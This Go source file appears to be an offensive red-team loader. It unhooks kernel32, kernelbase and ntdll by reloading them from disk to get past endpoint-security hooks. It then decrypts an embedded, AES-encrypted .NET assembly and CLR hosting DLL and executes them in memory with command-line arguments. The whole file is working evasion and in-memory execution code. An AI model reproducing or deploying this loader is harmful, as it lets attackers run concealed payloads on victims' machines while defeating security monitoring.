package main

import (
	"fmt"
	"log"
	"os"
	"strconv"

	"github.com/timwhitez/Doge-Assembly/assembly"
	"golang.org/x/sys/windows/registry"
)


func init(){
	Version := versionFunc()
	if Version == "10.0" {
		err := RefreshPE(`c:\windows\system32\kernel32.dll`)
		if err != nil {
			log.Println("RefreshPE failed:", err)
		}
		err = RefreshPE(`c:\windows\system32\kernelbase.dll`)
		if err != nil {
			log.Println("RefreshPE failed:", err)
		}
		fmt.Println("\nAll Dll Unhooked!\n")
		err = RefreshPE(`c:\windows\system32\ntdll.dll`)
		if err != nil {
			log.Println("RefreshPE failed:", err)
		}
	}
	
}

func versionFunc() string {
	k, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
	Version, _, _ :=  k.GetStringValue("CurrentVersion")
	majorVersion, _, err := k.GetIntegerValue("CurrentMajorVersionNumber")
	if err == nil{
		minorVersion, _, _ := k.GetIntegerValue("CurrentMinorVersionNumber")
		Version = strconv.FormatUint(majorVersion, 10) + "." + strconv.FormatUint(minorVersion, 10)
	}
	defer k.Close()

	return Version
}

func main() {
	assemblyArgs := ""
	if len(os.Args) > 1 {
		for i := 1 ;i < len(os.Args);i++{
			if i == 1 {
				assemblyArgs = os.Args[i]
			}else{
				assemblyArgs = assemblyArgs + " " + os.Args[i]
			}
		}
	}else{
		assemblyArgs = " "
	}

	key, err := Asset("data/aeskey.txt")
	if err != nil {
		panic(err)
	}

	assemblyBytesci, er := Asset("data/sharp.exe.cipher")

	if er != nil {
		panic(er)
	}
	hostingDLLci, er := Asset("data/clrx64.dll.cipher")

	if er != nil {
		panic(er)
	}

	assemblyBytes := decrypt(assemblyBytesci,key)

	hostingDLL := decrypt(hostingDLLci,key)

	fmt.Println("Decrypt Success... \n")

	fmt.Println("dll: "+strconv.Itoa(len(hostingDLL)))
	fmt.Println("bin: "+strconv.Itoa(len(assemblyBytes))+"\n")

	err = assembly.ExecuteAssembly(hostingDLL, assemblyBytes, assemblyArgs, true)
	if err != nil {
		log.Fatal(err)
	}
}
